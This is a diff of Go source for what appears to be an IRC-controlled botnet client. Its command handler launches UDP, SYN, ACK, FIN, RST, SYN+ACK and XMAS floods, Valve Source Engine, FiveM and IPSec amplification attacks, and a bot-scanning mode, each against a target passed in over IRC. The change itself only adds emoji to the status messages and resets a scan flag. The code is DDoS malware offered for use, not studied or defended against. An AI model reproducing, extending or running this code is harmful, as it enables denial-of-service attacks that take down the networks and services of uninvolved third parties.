@@ -65,7 +65,7 @@ func run(server string) error {
 			lib.AttackSwitch = false
 			go b.UDP(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
 				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
-			b.Report("START UDP FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START UDP FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?syn") && r.permission():
 			/*
 				SYN Flood
@@ -73,7 +73,7 @@ func run(server string) error {
 			lib.AttackSwitch = false
 			go b.SYN(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
 				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
-			b.Report("START SYN FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START SYN FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?ack") && r.permission():
 			/*
 				ACK Flood
@@ -81,7 +81,7 @@ func run(server string) error {
 			lib.AttackSwitch = false
 			go b.ACK(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
 				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
-			b.Report("START ACK FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START ACK FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?fin") && r.permission():
 			/*
 				FIN Flood
@@ -89,7 +89,7 @@ func run(server string) error {
 			lib.AttackSwitch = false
 			go b.FIN(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
 				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
-			b.Report("START FIN FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START FIN FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?rst") && r.permission():
 			/*
 				RST Flood
@@ -97,7 +97,7 @@ func run(server string) error {
 			lib.AttackSwitch = false
 			go b.RST(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
 				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
-			b.Report("START RST FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START RST FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?sap") && r.permission():
 			/*
 				SYN+ACK packet Flood
@@ -105,7 +105,7 @@ func run(server string) error {
 			lib.AttackSwitch = false
 			go b.SAP(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
 				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
-			b.Report("START SAP FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START SAP FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?xmas") && r.permission():
 			/*
 				XMAS Flood
@@ -113,34 +113,35 @@ func run(server string) error {
 			lib.AttackSwitch = false
 			go b.XMAS(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5),
 				lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
-			b.Report("START XMAS FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START XMAS FLOOD ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?vse") && r.permission():
 			/*
 				Valve Source Engine Amplification
 			*/
 			lib.AttackSwitch = false
 			go b.VSE(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
-			b.Report("START VSE ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START VSE ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?fms") && r.permission():
 			/*
 				FiveM Server Amplification
 			*/
 			lib.AttackSwitch = false
 			go b.FMS(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
-			b.Report("START FMS ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START FMS ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?ipsec") && r.permission():
 			/*
 				IPSec Amplification
 			*/
 			lib.AttackSwitch = false
 			go b.IPSEC(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
-			b.Report("START IPSEC ATTACK TO: " + lib.Recv(ircRead, 5))
+			b.Report("🗡 START IPSEC ATTACK TO: " + lib.Recv(ircRead, 5))
 		case lib.Find(ircRead, "?scan") && r.permission():
 			/*
 				Bot Scanner
 			*/
+			lib.ScanSwitch = false
 			go b.ScanMode(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
-			b.Report("START SCANNING.")
+			b.Report("👁 START SCANNING.")
 		case lib.Find(ircRead, "?info") && r.permission():
 			/*
 				Bot infomation
